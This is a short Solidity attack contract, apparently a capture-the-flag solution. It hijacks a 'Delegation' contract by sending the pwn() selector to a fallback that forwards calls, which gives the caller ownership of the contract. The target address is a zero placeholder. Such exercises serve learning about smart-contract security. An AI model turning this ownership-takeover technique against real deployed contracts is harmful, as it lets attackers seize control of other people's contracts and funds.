// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack_Delegation {
    // Address of the Delegation instance - the fallback lives here
    IDelegation target = IDelegation(0x0000000000000000000000000000000000000000);

    function executer() external { 
        bytes4 raw_selector = bytes4(keccak256("pwn()"));
        // bytes4 has no direct cast to bytes; bytes.concat() builds a new bytes memory since .call() requires bytes memory
        bytes memory selector = bytes.concat(raw_selector); // or -> bytes memory selector = abi.encodePacked(raw_selector);

        (bool success,) = address(target).call(selector);
        if (!success) {
            revert();
        }
    }
}

// Empty interface - only used to type "target"
interface IDelegation {

}